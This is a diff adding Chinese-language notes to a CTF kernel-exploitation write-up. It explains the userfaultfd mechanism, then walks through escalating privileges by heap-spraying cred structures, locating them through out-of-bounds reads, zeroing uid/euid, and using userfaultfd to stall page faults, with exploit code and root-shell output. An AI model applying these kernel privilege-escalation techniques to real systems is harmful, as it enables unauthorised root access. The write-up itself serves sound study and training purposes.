@@ -469,7 +469,403 @@ gdb-peda$ x/20gx $1
   *CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}
   
   ```
+  
+  另外，同`modprobe_path`类似的最终调用`call_usermodehelper`的全局变量还有：
+  
+  * poweroff_cmd
+  
+    ```c
+    // /kernel/reboot.c
+    char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
+    // /kernel/reboot.c
+    static int run_cmd(const char *cmd)
+        argv = argv_split(GFP_KERNEL, cmd, NULL);
+        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    // /kernel/reboot.c
+    static int __orderly_poweroff(bool force)    
+        ret = run_cmd(poweroff_cmd);
+    ```
+  
+    触发方式：通过调用`__orderly_poweroff`函数可以触发。
+  
+* userfaultfd机制提权
+
+  * userfaultfd机制简介
+
+    内核内存一般说包含两个部分：RAM，保存被使用的内存页；交换区，保存暂时闲置的内存页。然而除此之外，有部分内存不属于这两者，例如`mmap`创建的内存映射页。
+
+    mmap映射的地址在`read/write`访问之前并没有真正的创建（映射到实际的物理页）
+
+    ```c
+    A： mmap(0x1fff000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);
+    B: char* buffer = (char*)0x1fff000;
+    C: printf("read: %c\n", buffer[0]);
+    ```
+
+    在A执行完后，内核并没有将`fd`内容拷贝到`0x1fff000`。
+
+    在执行C时访问该虚拟地址，触发缺页错误，内核将做：（1）为`0x1fff000`创建物理帧；（2）从fd读取内容到`0x1fff000`；（3）在页表为该内存页建立合适的入口。
+
+    在这整个过程中，可以称作发生了一次缺页错误，将会导致内核切换上下文和中断。
+
+    而`userfaultfd`机制可以用作管理这类缺页错误，允许在用户空间完成对这类错误的处理，也就是一旦在内核触发了一次缺页错误，可以利用用户态程序去执行一些操作。
+
+    
+
+    具体地，该机制允许在多线程程序中指定一个线程处理进程其他线程的user-space的页面。
+
+    通过`userfaultfd`系统调用，返回一个`file descriptor`，通过`ioctl_userfaultfd`操作该`fd`完成`fault`的处理。
+
+    * read/POLLIN通知一个专用的userland的线程轮询和处理`fault`；
+    * 通过ioctl，`UFFDIO_*`可以管理注册在userfaultfd里的所有虚拟内存区，允许通过指定的线程处理这个fault，或者管理对应的虚拟地址；同mremap/mprotect相比，userfault的优势在于不会引入高荷载的结构体如`vmas`。
+
+    在用户空间定义`userfault handler`的步骤（示例代码`userfaultdf_demo.c`）
+
+    **Step1：创建一个uffd**
+
+    ```c
+    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+    ```
+
+    所有需要监视的内存区域、配置处理模式和最终的缺页处理都是通过`ioctl`对这个`uffd`操作完成的。
+
+    创建一个uffd之后，首先必须需要使用`UFFDIO_API ioctl`启用该uffd（完成user-space和kernel-space握手，确定API版本和支持的功能）
+
+    ```c
+    // UFFDIO_API 指针结构体
+       struct uffdio_api {
+            __u64 api;        /* Requested API version (input) */
+            __u64 features;   /* Requested features (input/output) */
+            __u64 ioctls;     /* Available ioctl() operations (output) */
+        };
+    
+    // before Linux 4.11
+    uffdio_api.features Must be zero.
+    // since Linux 4.11; below features enable
+        UFFD_FEATURE_EVENT_FORK 
+        UFFD_FEATURE_EVENT_REMAP 
+        UFFD_FEATURE_EVENT_REMOVE 
+        UFFD_FEATURE_EVENT_UNMAP 
+        UFFD_FEATURE_MISSING_HUGETLBFS 
+        UFFD_FEATURE_MISSING_SHMEM 
+        UFFD_FEATURE_SIGBUS 
+        
+    uffdio_api.api = UFFD_API;
+    uffdio_api.features = 0;
+    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
+        errExit("ioctl-UFFDIO_API");
+    ```
+
+    **Step2 注册/注销内存区域**
+
+    通过`UFFDIO_REGISTER`指定注册内存地址区域，在指定区域内发生page fault时，内核将通知user-space。
+
+    ```c
+    UFFDIO_REGISTER 			// 注册监视page-fault的内存区域
+    UFFDIO_UNREGISTER 			// 注销监视的page-fault内存区域
+    //注册结构体
+    
+    The argp argument is a pointer to a uffdio_register structure,
+    defined as:
+    
+    struct uffdio_range {
+        __u64 start;    /* Start of range */
+        __u64 len;      /* Length of range (bytes) */
+    };
+    
+    struct uffdio_register {
+    	struct uffdio_range range;
+        __u64 mode;     /* Desired mode of operation (input) */
+        __u64 ioctls;   /* Available ioctl() operations (output) */
+    };
+    //其中mode 定义了内存区域的操作类型，只能是UFFDIO_REGISTER_MODE_MISSING.
+    
+    
+    /* Create a private anonymous mapping. The memory will be
+                  demand-zero paged--that is, not yet allocated. When we
+                  actually touch the memory, it will be allocated via
+                  the userfaultfd. */
+    
+    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
+                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (addr == MAP_FAILED)
+        errExit("mmap");
+    
+    printf("Address returned by mmap() = %p\n", addr);
+    
+    /* Register the memory range of the mapping we just created for
+                  handling by the userfaultfd object. In mode, we request to track
+                  missing pages (i.e., pages that have not yet been faulted in). */
+    
+    uffdio_register.range.start = (unsigned long) addr;
+    uffdio_register.range.len = len;
+    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
+        errExit("ioctl-UFFDIO_REGISTER");
+    ```
+
+    **Step3 创建一个处理userfaultfd事件的线程**
+
+    该线程需要轮询和处理userfaultfd事件，因此相当于一个死循环
+
+    ```c
+           static void *
+           fault_handler_thread(void *arg)
+           {
+               static struct uffd_msg msg;   /* Data read from userfaultfd */
+    			...
+               struct uffdio_copy uffdio_copy;
+               uffd = (long) arg;			// userfaultfd参数
+    			...
+               /* Loop, handling incoming events on the userfaultfd
+                  file descriptor. */
+               for (;;) {
+                   /* See what poll() tells us about the userfaultfd. */
+                   struct pollfd pollfd;
+                   int nready;
+                   pollfd.fd = uffd;
+                   pollfd.events = POLLIN;
+                   nready = poll(&pollfd, 1, -1);
+             		...
+                   /* Read an event from the userfaultfd. */
+                   nread = read(uffd, &msg, sizeof(msg));
+                   if (nread == 0) {
+                       printf("EOF on userfaultfd!\n");
+                       exit(EXIT_FAILURE);
+                   }
+    				....
+                   /* We expect only one kind of event; verify that assumption. */
+                   if (msg.event != UFFD_EVENT_PAGEFAULT) {
+                       fprintf(stderr, "Unexpected event on userfaultfd\n");
+                       exit(EXIT_FAILURE);
+                   }
+    
+                   /* Copy the page pointed to by 'page' into the faulting
+                      region. Vary the contents that are copied in, so that it
+                      is more obvious that each fault is handled separately. */
+    			  // UFFDIO_COPY处理PAGE FAULT
+                   uffdio_copy.src = (unsigned long) page;
+    
+                   /* We need to handle page faults in units of pages(!).
+                      So, round faulting address down to page boundary. */
+    
+                   uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
+                                                      ~(page_size - 1);
+                   uffdio_copy.len = page_size;
+                   uffdio_copy.mode = 0;
+                   uffdio_copy.copy = 0;
+                   if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
+                       errExit("ioctl-UFFDIO_COPY");
+               }
+           }
+    
+    /* Create a thread that will process the userfaultfd events. */
+    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
+    if (s != 0) {
+        errno = s;
+        errExit("pthread_create");
+    }
+    ```
+
+  * 利用userfaultfd机制修改cred
+
+    提权的本质就是修改进程`cred`结构下`uid`和`euid`值为0即可得到root权限。
+
+    而如前所述，我们已经有了`任意地址读写`的条件，所以最便捷的方式就是找到`cred`结构体在内核中的位置，并修改其下的`euid`和`uid`为0。
+
+    cred结构体：
+
+    ```c
+    struct cred {
+        atomic_t    usage;
+    #ifdef CONFIG_DEBUG_CREDENTIALS
+        atomic_t    subscribers;    /* number of processes subscribed */
+        void        *put_addr;
+        unsigned    magic;
+    #define CRED_MAGIC    0x43736564
+    #define CRED_MAGIC_DEAD    0x44656144
+    #endif
+        kuid_t        uid;        /* real UID of the task */
+        kgid_t        gid;        /* real GID of the task */
+        kuid_t        suid;        /* saved UID of the task */
+        kgid_t        sgid;        /* saved GID of the task */
+        kuid_t        euid;        /* effective UID of the task */
+        kgid_t        egid;        /* effective GID of the task */
+        kuid_t        fsuid;        /* UID for VFS ops */
+        kgid_t        fsgid;        /* GID for VFS ops */
+        unsigned    securebits;    /* SUID-less security management */
+        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
+        kernel_cap_t    cap_permitted;    /* caps we're permitted */
+        kernel_cap_t    cap_effective;    /* caps we can actually use */
+        kernel_cap_t    cap_bset;    /* capability bounding set */
+        kernel_cap_t    cap_ambient;    /* Ambient capability set */
+    #ifdef CONFIG_KEYS
+        unsigned char    jit_keyring;    /* default keyring to attach requested
+                         * keys to */
+        struct key __rcu *session_keyring; /* keyring inherited over fork */
+        struct key    *process_keyring; /* keyring private to this process */
+        struct key    *thread_keyring; /* keyring private to this thread */
+        struct key    *request_key_auth; /* assumed request_key authority */
+    #endif
+    #ifdef CONFIG_SECURITY
+        void        *security;    /* subjective LSM security */
+    #endif
+        struct user_struct *user;    /* real user ID subscription */
+        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+        struct group_info *group_info;    /* supplementary groups for euid/fsgid */
+        struct rcu_head    rcu;        /* RCU deletion hook */
+    };
+    ```
+
+    如何在内核中找到我们进程的`cred`结构是关键。
+
+    ##### 堆喷
+
+    由于每一个进程都有一个`cred`结构体，且该结构体是由堆分配的，因此如果在操作全局变量pool之前，fork大量的进程，就能够在堆上构造出大量的`cred`结构体，利用越界读搜索当前堆前部分的内存，找到cred结构体，修改`euid`和`uid`值，使得部分进程结构体被修改，提权到root权限。
+
+    在[creds堆喷利用](https://www.anquanke.com/post/id/87225)这篇文章中提到了如何在内核地址空间找到cred位置，cred位于**堆基地址 + 一定偏移量**的位置，而我们能够越界读写也是基于堆地址的，因此，在pool变量维护的堆前的堆区一定存在大量的cred结构体。
+
+    **搜索cred特征**
+
+    `cred`结构体中，`uid`、`gid`、`suid`等8个字段的内容对于不同的用户权限值不同，通过`id`可以获取，在非特权用户中，默认都是1000，并且这些字段是`4`字节对齐的，因此我们只需要找到`uid`的位置，就可以重写这些字段为0，达到提权的目的。
+
+    ```c
+    #define MAX_HEAP_AREA 0x160000
+    #define SEARCH_SIZE  0x10000
+    
+    
+    
+    	alloc_object(0, mem, 0x100);
+    	read_object(0, mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);
+    	unsigned int* unit = (unsigned int*)mem;
+    
+    	puts("[*] Start to search for creds.");
+    	for(i = 0; i < SEARCH_SIZE/4; i++)
+    	{
+    		if(unit[i] == 1000 & unit[i+1] == 1000 & unit[i+2] == 1000 & unit[i+3] == 1000 & unit[i+4] == 1000 &
+    			unit[i+5] == 1000 & unit[i+6] == 1000 & unit[i+7] == 1000)
+    		{
+    
+    			cred_offset = i * 32;						// offset from read kernel start
+    			printf("[*] Find cred at offset 0x%lx\n", cred_offset);
+    			for(j = 0; j < 8; j++)
+    			{
+    				// modify uid | euid .. = 0
+    				unit[i+j] = 0;
+    			}
+    			break;
+    		}
+    	}
+    
+    	if (cred_offset == -1)
+    	{
+    		puts("[x] Failed to find creds!\n");
+    		exit(-1);
+    	}
+    ```
+
+    通过不断增加`MAX_HEAP_AREA`值，每次增加一个`SEARCH_SIZE`，向堆前搜索，最终发现当`MAX_HEAP_AREA`为`0x160000`时，能够稳定找到cred结构，因此可以确定`cred`在分配的第一块可利用堆前`0x150000`到`0x160000`之间。
+
+    而当它达到`0x180000`时，越界读将触发`pagefault in non-whitelisted uaccess`错误。
+
+    ```
+    MAX_HEAP_AREA = 0x160000
+    ~ $ ./exp
+    [*] Opened device.
+    [*] Creds heap Spray done!
+    [*] Start to search for creds.
+    [*] Find cred at offset 0xa304
+    
+    MAX_HEAP_AREA = 0x180000
+    ~ $ ./exp
+    [*] Opened device.
+    [*] Creds heap Spray done!
+    [    5.676221] BUG: pagefault on kernel address 0xffff8cfcfff7b500 in non-whitelisted uaccess
+    [    5.681390] BUG: unable to handle kernel paging request at ffff8cfcfff7b500
+    ```
+
+    **修改cred**
+
+    理论上，在搜索到cred在内核空间和可利用堆之间的距离后，利用越界写将修改后的cred复制到原位置即可提权。
+
+    修改前的cred值
+
+    ```assembly
+    gdb-peda$ p 0xffff8fea0017b500-0x160000+0xa304
+    $3 = 0xffff8fea00025804
+    gdb-peda$ x/8gx $3
+    0xffff8fea00025804:	0x000003e8000003e8	0x000003e8000003e8
+    0xffff8fea00025814:	0x000003e8000003e8	0x000003e8000003e8
+    ```
+
+    修改cred代码：
+
+    ```c
+    	// copy the modified mem to kernel
+    	write_object(0, mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);
+    ```
+
+    但是在`write`时又会触发`pagefault in non-whitelisted uaccess`
+
+    ```assembly
+    gdb-peda$ x/6gx $1
+    0xffffffffc03e8400:	0xffffa2148017b500	0x0000000000000100
+    0xffffffffc03e8410:	0x0000000000000000	0x0000000000000000
+    
+    ~ $ ./exp 
+    [*] Opened device.
+    [*] Creds heap Spray done!
+    [*] Start to search for creds.
+    [*] Find cred at offset 0xa304
+    [   28.202566] BUG: pagefault on kernel address 0xffffa21480099000 in non-whitelisted uaccess
+    ```
+
+    **使用userfaultfd挂起pagefualt**
+
+    userfaultfd可以允许对于指定的内存内发生的pagefault交由用户处理，因此，将cred和发生pagefault地址间的部分注册，即可挂起poagefault，避免kernel panic。
+
+    set up userfaultfd代码
+
+    ```c
+    	// set userfaultfd and overwrite cred
+    	unsigned long fault_page, fault_page_length;
+    	char *new_mem = (char *) mmap(NULL, MAX_HEAP_AREA, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    	memcpy(new_mem, mem, SEARCH_SIZE);
+    	fault_page = (uint64_t)new_mem + SEARCH_SIZE;
+    	fault_page_length = MAX_HEAP_AREA - SEARCH_SIZE;
+    	register_userfault(fault_page, fault_page_length);
+    
+    	write_object(0, new_mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);
+    ```
+
+    
+
+    成功提权（一定的几率）
+
+    ```
+    ~ $ ./exp 
+    [*] Opened device.
+    [*] Creds heap Spray done!
+    [*] Start to search for creds.
+    [*] Find cred at offset 0xa384
+    [*] Handler started !
+    [*] Get A PageFault.
+    [*] Spawn root at process 0 
+    /home/pwn # id
+    uid=0(root) gid=0 groups=1000
+    /home/pwn # whoami
+    root
+    ```
+
+    
+
+  * 利用userfaultfd机制条件竞争
+
+* 
 
 #### 参考链接
 
 * [Kernel-Pwn从任意地址读写到权限提升](http://p4nda.top/2018/11/07/stringipc/)
+* [call_usermodehelper提权变量路径总结](https://www.jianshu.com/p/a2259cd3e79e)
+* [userfaultfd机制在Kernel提权中的利用](https://f5.pm/go-71048.html)
+* [creds堆喷利用](https://www.anquanke.com/post/id/87225)
